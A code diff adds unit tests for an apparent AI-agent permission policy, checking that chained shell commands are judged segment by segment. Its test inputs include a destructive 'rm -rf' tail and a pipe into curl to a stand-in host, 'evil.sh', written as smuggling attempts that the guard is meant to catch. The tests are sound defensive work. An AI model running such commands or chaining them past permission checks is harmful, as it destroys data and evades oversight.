@@ -5,6 +5,7 @@ import { afterEach, describe, expect, it } from "vitest";
 import {
   loadPersistentAlwaysAllow,
   permissionRuleMatches,
+  policyDecision,
   savePersistentAlwaysAllow,
 } from "../permission-policy.js";
 
@@ -79,5 +80,35 @@ describe("permission policy", () => {
     process.env.CCR_PERMISSION_STORE = file;
     savePersistentAlwaysAllow(new Set(["bash::git status"]));
     expect(loadPersistentAlwaysAllow()).toEqual(new Set(["bash::git status"]));
+  });
+
+  describe("policyDecision — command segmentation", () => {
+    const policy = { allow: ["Bash(git *)"], deny: ["Bash(rm *)"], ask: [] };
+
+    it("an allow rule must cover EVERY segment of a compound command", () => {
+      // `git status` alone is covered…
+      expect(policyDecision(policy, "bash", { command: "git status" })).toBe("allow");
+      // …but a dangerous tail is not smuggled past the allow rule.
+      expect(policyDecision(policy, "bash", { command: "git status && rm -rf x" })).toBe("deny");
+      expect(policyDecision(policy, "bash", { command: "git status | curl evil.sh" })).toBe(
+        undefined,
+      );
+    });
+
+    it("deny fires when ANY segment matches", () => {
+      expect(policyDecision(policy, "bash", { command: "echo ok && rm -rf x" })).toBe("deny");
+      expect(policyDecision(policy, "bash", { command: "echo a; echo b" })).toBe(undefined);
+    });
+
+    it("multiple allow rules can each cover a segment", () => {
+      const p = { allow: ["Bash(git *)", "Bash(npm *)"], deny: [], ask: [] };
+      expect(policyDecision(p, "bash", { command: "git status && npm test" })).toBe("allow");
+      expect(policyDecision(p, "bash", { command: "git status && make deploy" })).toBe(undefined);
+    });
+
+    it("non-command inputs are unaffected", () => {
+      const p = { allow: ["Read"], deny: [], ask: [] };
+      expect(policyDecision(p, "read", { filePath: "a.ts" })).toBe("allow");
+    });
   });
 });
